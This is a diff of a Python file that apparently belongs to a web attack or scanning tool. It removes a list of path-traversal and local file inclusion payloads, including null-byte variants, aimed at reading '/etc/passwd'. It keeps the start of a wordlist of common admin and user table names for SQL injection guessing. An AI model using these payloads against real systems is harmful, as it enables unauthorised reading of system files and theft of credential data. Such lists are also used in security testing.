@@ -1,19 +1,6 @@
 #!/usr/bin/python
 # -*- coding: latin-1 -*-
 
-lfis = ["/etc/passwd", "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
-        "../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
-        "../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd",
-        "../../../../../../../../../../etc/passwd", "/etc/passwd", "../etc/passwd", "../../etc/passwd",
-        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd", "../../../../../../etc/passwd",
-        "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
-        "../../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd", "/etc/passwd%00",
-        "../etc/passwd%00", "../../etc/passwd%00", "../../../etc/passwd%00", "../../../../etc/passwd%00",
-        "../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00",
-        "../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../../etc/passwd%00",
-        "../../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../../../../etc/passwd%00"]
-
 
 tables = ['user', 'users', 'tbladmins', 'Logins', 'logins', 'login', 'admins', 'members', 'member', '_wfspro_admin',
           '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user',
